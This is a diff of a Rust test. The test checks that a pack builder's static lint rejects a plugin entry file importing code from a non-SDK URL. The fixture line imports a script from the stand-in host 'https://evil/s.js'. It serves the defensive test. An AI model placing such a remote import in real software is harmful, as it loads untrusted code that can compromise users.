@@ -728,10 +728,10 @@ mod tests {
         std::fs::write(&entry, "import x from 'https://evil/s.js'\nexport default { id: 'review_toolkit', register() {} }\n").unwrap();
         let error = super::super::build::build_pack(&dir, &NoPlugins, None).unwrap_err();
         assert!(
-            format!("{}", ErrorChain(error.as_ref())).contains("static lint refuses")
-                && format!("{}", ErrorChain(error.as_ref())).contains("non-sdk import"),
+            format!("{}", ErrorChain(&error)).contains("static lint refuses")
+                && format!("{}", ErrorChain(&error)).contains("non-sdk import"),
             "{}",
-            ErrorChain(error.as_ref())
+            ErrorChain(&error)
         );
     }
 
